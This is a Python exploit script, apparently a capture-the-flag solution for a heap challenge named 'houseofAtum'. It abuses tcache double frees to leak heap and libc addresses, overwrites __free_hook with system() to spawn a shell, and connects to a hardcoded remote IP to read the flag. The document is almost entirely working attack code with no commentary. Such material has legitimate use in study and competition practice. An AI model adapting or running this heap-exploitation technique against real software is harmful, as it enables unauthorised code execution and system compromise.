#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './houseofAtum'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'60.205.224.216', 'port':9999})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn):
    th = Atum(conn)

    th.new(('a'*0x8+p64(0x51))*4)   # 0
    th.new(('b'*0x8+p64(0x11))*4)   # 1

    for _ in range(2):
        th.delete(0, False)

    addr_heap_base = u(th.show(0)) - 0x260
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    for _ in range(5):
        th.delete(0, False)
    th.delete(1)
    th.delete(0)

    for _ in range(3):
        th.new('A'*8)       # 0
        th.new('B'*8)       # 1

        for _ in range(2):
            th.delete(0, False)
        th.delete(1)
        th.delete(0)

    th.new(p64(0)+p64(0x91))    # 0
    th.new('B'*8)               # 1

    for _ in range(8):
        th.delete(1, False)

    addr_libc_mainarena = u(th.show(0)) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    th.edit(0, p64(0)+p64(0x51))
    th.delete(1)
    th.edit(0, '/bin/sh\x00'+p64(0x21)+p64(addr_libc_free_hook))
    th.new('B'*8)                   # 1
    th.delete(1)

    th.new(p64(addr_libc_system))   # 1
    conn.sendlineafter('choice:', '3')
    conn.sendlineafter('idx:', '0')
    
class Atum:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def new(self, data):
        self.sendlineafter('choice:', '1')
        self.sendafter('content:', data[:0x40])

    def edit(self, idx, data):
        self.sendlineafter('choice:', '2')
        self.sendlineafter('idx:', str(idx))
        self.sendafter('content:', data[:0x40])

    def delete(self, idx, clear=True):
        self.sendlineafter('choice:', '3')
        self.sendlineafter('idx:', str(idx))
        self.sendlineafter('(y/n):', 'y' if clear else 'n')

    def show(self, idx):
        self.sendlineafter('choice:', '4')
        self.sendlineafter('idx:', str(idx))
        self.recvuntil('Content:')
        return self.recvuntil('\nDone!', drop=True)


#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.sendline('cat ./flag')
    conn.interactive()
    
#==========
